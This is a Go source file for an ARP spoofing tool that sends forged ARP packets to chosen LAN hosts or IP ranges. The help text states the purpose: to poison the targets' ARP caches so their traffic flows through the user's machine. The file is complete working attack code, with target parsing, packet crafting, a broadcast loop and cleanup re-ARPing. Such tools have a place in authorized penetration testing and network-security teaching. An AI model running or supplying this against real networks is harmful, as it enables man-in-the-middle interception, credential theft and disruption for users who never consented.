// Copyright (c) 2016 José Nieto, https://menteslibres.net/xiam
//
// Permission is hereby granted, free of charge, to any person obtaining
// a copy of this software and associated documentation files (the
// "Software"), to deal in the Software without restriction, including
// without limitation the rights to use, copy, modify, merge, publish,
// distribute, sublicense, and/or sell copies of the Software, and to
// permit persons to whom the Software is furnished to do so, subject to
// the following conditions:
//
// The above copyright notice and this permission notice shall be
// included in all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
// EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
// MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
// NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE
// LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION
// OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
// WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

package main

import (
	"bytes"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/xiam/arpfox/arp"

	"github.com/ArturoVM/targetparser"
)

var (
	flagInterface    = flag.String("i", "eth0", `Network interface.`)
	flagTarget       = flag.String("t", "", `Target host(s). Provide a single IP: "1.2.3.4", a list of IPs: "1.2.3.4, 5.6.7.8", a CIDR block "1.2.3.0/24" or an IP range: "1.2.3-7.4-12"`)
	flagWaitInterval = flag.Float64("w", 5.0, `Wait <w> seconds between every broadcast, <w> must be a value greater than 0.1.`)
	flagHelp         = flag.Bool("h", false, `Print usage instructions and exit.`)
)

func main() {
	flag.Parse()

	if *flagHelp {
		fmt.Println("arpspoof sends specially crafted ARP packets to a given target on a LAN in")
		fmt.Println("order to alter the target's ARP cache table and make the target send network")
		fmt.Println("packets to the user's machine instead of to the legitimate host.")
		fmt.Println("")
		fmt.Println("Kernel IP forwarding must be turned on ahead of time.")
		fmt.Println("")
		fmt.Println("Usage: ")
		fmt.Println("arpspoof [-i interface] -t target host")
		fmt.Println("")
		flag.PrintDefaults()
		os.Exit(0)
	}

	if *flagWaitInterval < 0.1 {
		*flagWaitInterval = 0.1
	}

	if *flagTarget == "" {
		log.Fatal("Missing target (-t 192.168.1.7).")
	}

	iface, err := net.InterfaceByName(*flagInterface)
	if err != nil {
		log.Fatalf("Could not use interface %s: %v", *flagInterface, err)
	}

	handler, err := pcap.OpenLive(iface.Name, 65535, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handler.Close()

	var ifaceAddr *net.IPNet
	ifaceAddrs, err := iface.Addrs()
	if err != nil {
		log.Fatal(err)
	}

	for _, addr := range ifaceAddrs {
		if ipnet, ok := addr.(*net.IPNet); ok {
			if ip4 := ipnet.IP.To4(); ip4 != nil {
				ifaceAddr = &net.IPNet{
					IP:   ip4,
					Mask: net.IPMask([]byte{0xff, 0xff, 0xff, 0xff}),
				}
				break
			}
		}
	}
	if ifaceAddr == nil {
		log.Fatal("Could not get interface address.")
	}

	var targetAddrs []net.IP
	if *flagTarget != "" {
		addrRange, err := targetparser.Parse(*flagTarget)
		if err != nil {
			log.Fatal("Wrong format for target.")
		}
		targetAddrs = expandIPRange(ipRange(addrRange.Min, addrRange.Max))
		if len(targetAddrs) == 0 {
			log.Fatalf("No valid targets given.")
		}
	}

	hostIP := ifaceAddr.IP
	if argHostIP := flag.Arg(0); argHostIP != "" {
		hostIP = net.ParseIP(argHostIP)
		if hostIP == nil {
			log.Fatalf("Wrong format for host IP.")
		}
		hostIP = hostIP.To4()
	}

	stop := make(chan struct{}, 2)

	// Waiting for ^C
	c := make(chan os.Signal)
	signal.Notify(c, os.Interrupt)
	go func() {
		for {
			select {
			case <-c:
				close(stop)
				return
			}
		}
	}()

	go readARP(handler, stop, iface)

	// Get original source
	origSrc, err := arp.Lookup(hostIP.To4().String())
	if err != nil {
		log.Fatalf("Unable to lookup hw address for %s: %v", hostIP, err)
	}

	fakeSrc := arp.Address{
		IP:           hostIP,
		HardwareAddr: iface.HardwareAddr,
	}

	<-writeARP(handler, stop, targetAddrs, &fakeSrc, time.Duration(*flagWaitInterval*1000.0)*time.Millisecond)

	<-cleanUpAndReARP(handler, targetAddrs, origSrc)

	os.Exit(0)
}

func cleanUpAndReARP(handler *pcap.Handle, targetAddrs []net.IP, src *arp.Address) chan struct{} {
	log.Printf("Cleaning up and re-ARPing targets...")

	stopReARPing := make(chan struct{})
	go func() {
		t := time.NewTicker(time.Second * 5)
		<-t.C
		close(stopReARPing)
	}()

	return writeARP(handler, stopReARPing, targetAddrs, src, 500*time.Millisecond)
}

func writeARP(handler *pcap.Handle, stop chan struct{}, targetAddrs []net.IP, src *arp.Address, waitInterval time.Duration) chan struct{} {
	stoppedWriting := make(chan struct{})
	go func(stoppedWriting chan struct{}) {
		t := time.NewTicker(waitInterval)
		for {
			select {
			case <-stop:
				stoppedWriting <- struct{}{}
				return
			case <-t.C:
				for _, ip := range targetAddrs {
					arpAddr, err := arp.Lookup(ip.String())
					if err != nil {
						log.Printf("Could not retrieve %v's MAC address: %v", ip, err)
						continue
					}
					dst := &arp.Address{
						IP:           ip,
						HardwareAddr: arpAddr.HardwareAddr,
					}
					buf, err := arp.NewARPRequest(src, dst)
					if err != nil {
						log.Print("NewARPRequest: ", err)
						continue
					}
					if err := handler.WritePacketData(buf); err != nil {
						log.Print("WritePacketData: ", err)
					}
				}
			}
		}
	}(stoppedWriting)
	return stoppedWriting
}

func readARP(handle *pcap.Handle, stop chan struct{}, iface *net.Interface) {
	src := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet)
	in := src.Packets()
	for {
		var packet gopacket.Packet
		select {
		case <-stop:
			return
		case packet = <-in:
			arpLayer := packet.Layer(layers.LayerTypeARP)
			if arpLayer == nil {
				continue
			}
			packet := arpLayer.(*layers.ARP)
			if !bytes.Equal([]byte(iface.HardwareAddr), packet.SourceHwAddress) {
				continue
			}
			if packet.Operation == layers.ARPReply {
				arp.Add(net.IP(packet.SourceProtAddress), net.HardwareAddr(packet.SourceHwAddress))
			}
			log.Printf("ARP packet (%d): %v (%v) -> %v (%v)", packet.Operation, net.IP(packet.SourceProtAddress), net.HardwareAddr(packet.SourceHwAddress), net.IP(packet.DstProtAddress), net.HardwareAddr(packet.DstHwAddress))
		}
	}
}
